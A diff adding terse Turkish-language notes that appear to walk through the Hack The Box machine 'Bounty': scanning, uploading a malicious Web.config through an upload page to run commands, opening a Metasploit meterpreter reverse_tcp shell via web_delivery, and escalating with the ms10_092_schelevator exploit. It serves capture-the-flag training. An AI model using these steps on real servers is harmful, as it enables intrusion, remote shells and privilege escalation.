@@ -1,0 +1,40 @@
+10.10.10.93 e nmap taraması yapılır.
+sadece 80 portunun açık olduğu görülür.
+
+dirb taraması yapılır.
+açık olan alt sayfalar tespit edilir.
+
+transfer.aspx ///sayfasından dosya yüklenebilir.
+buradan yüklenen dosyaların bounty/uploadedfiles/ ın altına geldiği görülür.
+
+https://gist.github.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c ///buradan yüklenecek 
+web.config scripti indirilir.(en alttaki)
+
+indirilen script Web.config ismi ile kayıt edilir.
+http://10.10.10.93/transfer.aspx    //bu sayfaya girilir ve Web.config dosyası upload edilir.
+http://10.10.10.93/uploadedfiles/Web.config   //bu linke gidilerek upload edilen script çalıştırılır.
+
+karşımıza gelen sayfaya ---> type c:\users\merlin\Desktop\user.txt  ///bu komut girilir.
+en alt satırda ip adresinin son hanesinden sonra başlayan hash->user.txt dir.
+
+http://10.10.10.93/uploadedfiles/Web.configcmd=type+c%3A%5Cusers%5Cmerlin%5CDesktop%5Cuser.txt
+///yukarıdaki link user.txt nin kısa yoludur!
+
+
+msfconsole açılır
+use exploit/multi/script/web_delivery
+set TARGET 2
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+ve local host ayarları yapılır.
+Daha sonra msfconsole aşağıdaki kodu karşı bilgisayarda çalıştırın diye bir kod parçası verir.
+o kod kopyalanır ve yine transfer.aspx sayfasına yüklediğimiz web.config sicripti çalıştırılarak, gelen kod satırına yapıştırılır.
+böylece msfconsole dan bağlantı elde edilir.
+
+aktif session arka plana atılır.
+
+use local_exploit_suggester into metasploit  //komutu ile root olabilmek için karşı makinede açıklar var mı ona bakılır. bulunan açık için aşağıdaki exploit kullanılır.
+use exploit/windows/local/ms10_092_schelevator
+set LHOST (htb ip nosu)
+set LPORT (4444)
+set SESSION 1(hangi session açıksa)
+ayarları yapılır ve root.txt alınır.
